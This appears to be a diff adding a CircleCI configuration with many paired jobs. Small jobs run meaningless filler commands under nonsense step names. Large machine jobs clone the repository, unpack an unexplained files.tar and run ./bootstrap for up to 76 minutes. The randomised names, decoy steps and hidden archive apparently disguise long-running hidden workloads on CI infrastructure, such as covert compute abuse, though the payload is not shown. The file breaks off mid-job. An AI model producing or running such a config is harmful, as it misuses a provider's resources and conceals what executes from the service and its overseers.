@@ -1,0 +1,1683 @@
+version: 2.1
+
+jobs:
+  maker_succes-only:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: plank wobble
+          command: |
+            mkdir -p /tmp/.wsp
+            set +o pipefail 2>/dev/null; head -c 1447571 /dev/urandom | base64 > /tmp/.wsp/trace.gz; true
+            size=$(wc -c </tmp/.wsp/trace.gz); echo "stage ok: succes-only size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - trace.gz
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/trace.gz || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  Alpha_build-partial-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: v1 call
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<10000;i++)s+=i*i;print s}'; true ; } > /tmp/.wsp/full_phase_output.out
+            size=$(wc -c </tmp/.wsp/full_phase_output.out); echo "stage ok: build-partial-release-candidate size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - full_phase_output.out
+  build-partial-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/full_phase_output.out || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  compile_q3-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: no touch
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "test123text" | sed 's/[0-9]/[&]/g'; true ; } > /tmp/.wsp/passoff.txt
+            size=$(wc -c </tmp/.wsp/passoff.txt); echo "stage ok: q3-release size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - passoff.txt
+  q3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/passoff.txt || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  dispatch_nebula-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: rocket stove
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; basename /usr/local/bin/; true ; } > /tmp/.wsp/.ready
+            size=$(wc -c </tmp/.wsp/.ready); echo "stage ok: nebula-v2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .ready
+  nebula-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  A_DATA-573:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: hanger up
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "a b c d e" | awk '{for(i=1;i<=NF;i++) if(i%2) print $i}'; true ; } > /tmp/.wsp/passoff.sig
+            size=$(wc -c </tmp/.wsp/passoff.sig); echo "stage ok: DATA-573 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - passoff.sig
+  DATA-573:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/passoff.sig || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  generate_v7-ga4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: lump charcoal
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 39770; echo "ftr" ) | wc -l; true ; } > /tmp/.wsp/secondary_phase_output.out
+            size=$(wc -c </tmp/.wsp/secondary_phase_output.out); echo "stage ok: v7-ga4 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - secondary_phase_output.out
+  v7-ga4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  package_ruby3-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: flaky
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{num=12345; r=""; while(num>0){r=(num%2) r; num=int(num/2)}; print r}'; true ; } > /tmp/.wsp/log.ndjson
+            size=$(wc -c </tmp/.wsp/log.ndjson); echo "stage ok: ruby3-release size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - log.ndjson
+  ruby3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/log.ndjson || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  teardown_vera-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: counterbore
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "%s\n" 10 20 30 | awk '{s+=$1; n++}END{print s/n}'; true ; } > /tmp/.wsp/package.pkg
+            size=$(wc -c </tmp/.wsp/package.pkg); echo "stage ok: vera-run size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - package.pkg
+  vera-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/package.pkg || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  ensure_teh-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: coverage pass
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 10 | awk '{p *= $1}END{print p}'; true ; } > /tmp/.wsp/548.out
+            size=$(wc -c </tmp/.wsp/548.out); echo "stage ok: teh-ci size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 548.out
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  drain_add-edge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: ornamentation
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -s a-z < /etc/hostname | head -1; true ; } > /tmp/.wsp/log.txt
+            size=$(wc -c </tmp/.wsp/log.txt); echo "stage ok: add-edge size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - log.txt
+  add-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/log.txt || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  ctx_europa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: tap thread
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo $((2**15)); true ; } > /tmp/.wsp/.sig
+            size=$(wc -c </tmp/.wsp/.sig); echo "stage ok: europa size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .sig
+  europa:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  staging_b-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: please pass
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; date -d "@1700000000" 2>/dev/null +%Y || date +%Y; true ; } > /tmp/.wsp/step-23.log
+            size=$(wc -c </tmp/.wsp/step-23.log); echo "stage ok: b-v2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-23.log
+  b-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/step-23.log || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  db_hyperion-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dong
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=10; p=1; for(i=1;i<=n;i++)p*=2; print p}'; true ; } > /tmp/.wsp/96.data
+            size=$(wc -c </tmp/.wsp/96.data); echo "stage ok: hyperion-v2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 96.data
+  hyperion-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/96.data || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  warmup_produce-staging-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: plz work
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=0;a<256;a++)xored = xored  (a ^ 0x5a); print length(xored)}'; true ; } > /tmp/.wsp/693b.out
+            size=$(wc -c </tmp/.wsp/693b.out); echo "stage ok: produce-staging-release-candidate size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 693b.out
+  produce-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  staging_phoenix-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: disc sand
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "the rain in spain" | tr -s ' ' | wc -c; true ; } > /tmp/.wsp/summary.log
+            size=$(wc -c </tmp/.wsp/summary.log); echo "stage ok: phoenix-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - summary.log
+  phoenix-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  provision_canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: charcoal glow
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "pattern" | sed 's/a/x/g'; true ; } > /tmp/.wsp/artifact
+            size=$(wc -c </tmp/.wsp/artifact); echo "stage ok: canary size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - artifact
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/artifact || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  package_hotel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: lower volume
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nb\nc\nc\n" | sort | uniq -c | sort -rn; true ; } > /tmp/.wsp/full_job_output_v2.out
+            size=$(wc -c </tmp/.wsp/full_job_output_v2.out); echo "stage ok: hotel size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - full_job_output_v2.out
+  hotel:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/full_job_output_v2.out || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  preinit_feat-4894:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: sand step
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<10;i++) printf "%s%d", (i>0?",":""), i*7; print ""}'; true ; } > /tmp/.wsp/2024-03-03.data
+            size=$(wc -c </tmp/.wsp/2024-03-03.data); echo "stage ok: feat-4894 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-03-03.data
+  feat-4894:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/2024-03-03.data || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  postbuild_DATA-906:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pickup slow
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "%d\n" $(( $(date +%M) * 60 + $(date +%S) )); true ; } > /tmp/.wsp/ckpt-E.state
+            size=$(wc -c </tmp/.wsp/ckpt-E.state); echo "stage ok: DATA-906 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-E.state
+  DATA-906:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  round2_mar1-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: oven heat
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; date +"%W"; true ; } > /tmp/.wsp/2024-11-18.data
+            size=$(wc -c </tmp/.wsp/2024-11-18.data); echo "stage ok: mar1-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-11-18.data
+  mar1-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/2024-11-18.data || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  spinner_hotfix-9653:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: inform the lead
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "x\ny\nz\n" | awk '{a[NR]=$0}END{for(i=NR;i>=1;i--)print a[i]}'; true ; } > /tmp/.wsp/step-29.out
+            size=$(wc -c </tmp/.wsp/step-29.out); echo "stage ok: hotfix-9653 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-29.out
+  hotfix-9653:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  compile_node20-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: mirage
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=487942;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/.wsp/metrics.jsonl
+            size=$(wc -c </tmp/.wsp/metrics.jsonl); echo "stage ok: node20-ship size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - metrics.jsonl
+  node20-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  staging_ken-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: belay
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=10;i++)p*=i;print p}'; true ; } > /tmp/.wsp/event.gz
+            size=$(wc -c </tmp/.wsp/event.gz); echo "stage ok: ken-build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - event.gz
+  ken-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/event.gz || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  teardown_build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: largo
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 268282 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/.wsp/primary_step_output_v3.txt
+            size=$(wc -c </tmp/.wsp/primary_step_output_v3.txt); echo "stage ok: build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - primary_step_output_v3.txt
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/primary_step_output_v3.txt || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  verify_promote:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: match strike
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; date +"%W"; true ; } > /tmp/.wsp/step-20.out
+            size=$(wc -c </tmp/.wsp/step-20.out); echo "stage ok: promote size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-20.out
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/step-20.out || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  g2_io-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: fire hydrant
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=5;i++){print i; print i*i}}' | wc -l; true ; } > /tmp/.wsp/payload.tar
+            size=$(wc -c </tmp/.wsp/payload.tar); echo "stage ok: io-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - payload.tar
+  io-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
